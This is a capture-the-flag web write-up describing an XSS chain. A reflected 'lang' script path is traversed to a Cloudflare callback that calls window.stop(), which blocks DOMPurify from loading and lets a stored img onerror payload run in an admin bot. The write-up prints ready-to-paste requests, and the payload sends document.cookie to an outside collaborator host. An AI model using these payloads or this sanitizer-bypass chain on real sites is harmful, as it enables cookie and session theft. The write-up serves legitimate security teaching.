# Generative polygl0t Transformer — Writeup

+ Author: pilvar
+ Category: web
+ Intended difficulty: hard
+ Solves during competition: 2/10

## TL;DR

The chat page renders the user-supplied `lang` query parameter straight into
a `<script src="/static/lang/{{raw_lang}}.js">` tag. Two characteristics of
the page combine into an XSS that fires on the admin bot's browser:

1. Client-side sanitization is provided by **DOMPurify loaded as an ES
   module** (`import DOMPurify from 'https://.../+esm'`), and the chat
   rendering is wrapped in `setTimeout(refresh, 1000)`. A one-second delay
   "to let DOMPurify load" is plenty of time to race the import.
2. The site is deployed behind **Cloudflare**, which means `/cdn-cgi/...`
   is always reachable and will happily serve Cloudflare's own JavaScript.
   Path-traversing the `lang` parameter into a Cloudflare-served script
   gives us a JS gadget that calls `window.stop()`, aborting the in-flight
   DOMPurify import.

With DOMPurify undefined, `sanitizeChat` throws inside a `try/catch` and is
silently swallowed, and `renderChat` assigns the raw prompt straight to
`innerHTML`. Any `<img src=x onerror=...>` in the prompt now fires in the
bot's session, where the **flag cookie is stored with `httpOnly=false`** on
purpose. `document.cookie` exfiltration is all that is required.

## Challenge overview

- Players register/log in (registration returns a one-time random password).
- Players can submit a "prompt" and then dispatch the resulting chat either
  to the human admin queue or to an admin bot powered by headless Chromium.
- The admin bot visits the chat URL with the flag cookie set
  (`FLAG_COOKIE_NAME=flag`, value = `FLAG`, `httpOnly=false`, same domain
  as the site).
- The `/chat/<id>` page is public so that the bot can visit it without
  authenticating.

The intended goal is to fire JavaScript inside the bot's browser session
and read `document.cookie`.

## Recon

### Prompt storage is unsanitized on the wire

`/api/chat?id=<id>` returns the **raw** `prompt_source` — whatever the user
POSTed as `prompt`. Server-side sanitization happens only when rendering to
other places (dashboard preview, etc.). So any payload we put in `prompt`
survives to the chat response verbatim.

### Rendering sanitization is only client-side

```js
function sanitizeChat(chat) {
    try {
        chat.prompt = DOMPurify.sanitize(chat.prompt);
        chat.answer = DOMPurify.sanitize(chat.answer);
    } catch (err) {
        console.log(err);
    }
}
```

`DOMPurify` is imported as an ES module:

```html
<script type="module">
    import DOMPurify from 'https://cdn.jsdelivr.net/npm/dompurify@3.4.0/+esm';
    window.DOMPurify = DOMPurify;
</script>
```

And `renderChat` is scheduled one second after the page loads:

```js
setTimeout(refresh, 1000);
```

If `DOMPurify` is not yet defined (or never gets defined) by the time the
1s timer fires, `sanitizeChat` throws `ReferenceError: DOMPurify is not
defined`, the `catch` silently swallows it, and rendering proceeds with the
unsanitized values:

```js
promptContent.innerHTML = chat.prompt;
```

### The `lang` parameter is reflected raw

The server templates the request query parameter straight into a script
tag, **without** validating it:

```html
{% if raw_lang %}
<script src="/static/lang/{{ raw_lang }}.js"></script>
{% endif %}
```

Sending `?lang=../../cdn-cgi/somepath.js` makes the browser load
`/cdn-cgi/somepath.js` from the origin — which, behind Cloudflare, is
served by Cloudflare itself, not by our app.

### Dispatch endpoint accepts an attacker-controlled path

The dispatch endpoint only checks that the URL starts with `/chat/`:

```python
if not path.startswith("/chat/"):
    return json_error("invalid_url", 400)
chat_id = path.split("?", 1)[0].split("#", 1)[0][len("/chat/"):]
```

So we can append whatever query string we want, including `?lang=<gadget>`,
and the bot will visit the exact URL we specify.

## Exploit chain

### Stage 1 — store the XSS payload as the prompt

```http
POST /api/chats
Content-Type: application/json
Cookie: <authenticated player session>

{"prompt":"<img src=x onerror='document.location=\"https://ajxsiah5n37vo4czvh3k0jnlscy3mtai.oastify.com/\"+btoa(document.cookie)'>"}
```

Response:

```json
{"id":"6950538d78354af0b8ed0bb5512b8e6d", "status": "draft", "url": "..."}
```

### Stage 2 — dispatch the bot at `/chat/<id>` with the Cloudflare gadget

```http
POST /api/dispatch
Content-Type: application/json
Cookie: <authenticated player session>

{"target":"bot","url":"/chat/6950538d78354af0b8ed0bb5512b8e6d?lang=../../cdn-cgi/challenge-platform/h/g/scripts/jsd/api.js/api.js%3fonload=stop%26"}
```

Decoded, the `lang` parameter is:

```
../../cdn-cgi/challenge-platform/h/g/scripts/jsd/api.js/api.js?onload=stop&
```

The `<script src>` tag becomes:

```html
<script src="/static/lang/../../cdn-cgi/challenge-platform/h/g/scripts/jsd/api.js/api.js?onload=stop&.js"></script>
```

The browser normalizes `..` segments and fetches
`/cdn-cgi/challenge-platform/h/g/scripts/jsd/api.js/api.js?onload=stop&.js`.
Cloudflare serves a script with a JSONP-style callback parser that
interprets `onload` as the name of a global function to invoke after load:
`window["stop"]()` — i.e. `window.stop()`.

`window.stop()` aborts all in-flight network activity, including the
`+esm` fetch chain used by DOMPurify's ES-module import. DOMPurify never
finishes loading, so `window.DOMPurify` stays `undefined`.

### Stage 3 — XSS fires

- After 1s, `refresh()` runs.
- `sanitizeChat()` throws on the undefined `DOMPurify`; the `catch`
  silently swallows the error.
- `promptContent.innerHTML = chat.prompt` injects our `<img ... onerror=...>`
  into the DOM.
- `onerror` runs in the bot's browser, reading `document.cookie` (which
  now includes the non-httpOnly `flag` cookie) and exfiltrating it to the
  attacker-controlled collaborator.

### Stage 4 — collect

The collaborator receives a request like:

```
GET /ZmxhZz1FUEZMey4uLn07IHByZWZlcnJlZF9sYW5nPWVu
```

`base64 -d` the path and extract the flag from the `flag=...` portion.

## Why each primitive exists

| Primitive                                       | Why it exists                                                                                      |
| ----------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| Raw `?lang=` templated into `<script src>`      | gives us a same-origin script inclusion primitive, trivially reachable with path traversal         |
| DOMPurify loaded via `import` from a CDN        | the import is network-dependent and can be aborted                                                 |
| `setTimeout(refresh, 1000)`                     | gives the gadget enough time to run and kill the DOMPurify request                                 |
| `try/catch` that swallows sanitize errors       | means a missing DOMPurify fails open instead of failing closed                                     |
| Server returns `prompt_source` untouched        | the payload survives the round-trip from `POST /api/chats` to `GET /api/chat`                      |
| Flag cookie set with `httpOnly=false`           | `document.cookie` must actually include the flag for the XSS to matter                             |
| Public `/chat/<id>` page                        | allows the bot to visit without authenticating as us                                               |
| Cloudflare deployment                           | `/cdn-cgi/...` serves Cloudflare's JS; the gadget (`onload=stop`) only exists in that environment  |

## Things worth noting

- The bot now runs each visit in a fresh incognito-equivalent context
  (`new browser.launch → new_context → close`), so previous sessions never
  leak into the next one.
- Each visit is capped at 10 seconds total, which is plenty for the 1s
  `setTimeout` plus the XSS `onerror` to fire but prevents a single slow
  visit from stalling the queue.
- The dispatch response includes a `queuePosition`; if multiple people are
  racing the bot, the chat page polls `/api/chat?id=...` and reflects the
  current bot-queue position until the job starts.

## Payloads (copy/paste)

Prompt body:

```json
{"prompt":"<img src=x onerror='document.location=\"https://ajxsiah5n37vo4czvh3k0jnlscy3mtai.oastify.com/\"+btoa(document.cookie)'>"}
```

Dispatch body (replace the chat id with what `/api/chats` returned):

```json
{"target":"bot","url":"/chat/6950538d78354af0b8ed0bb5512b8e6d?lang=../../cdn-cgi/challenge-platform/h/g/scripts/jsd/api.js/api.js%3fonload=stop%26"}
```
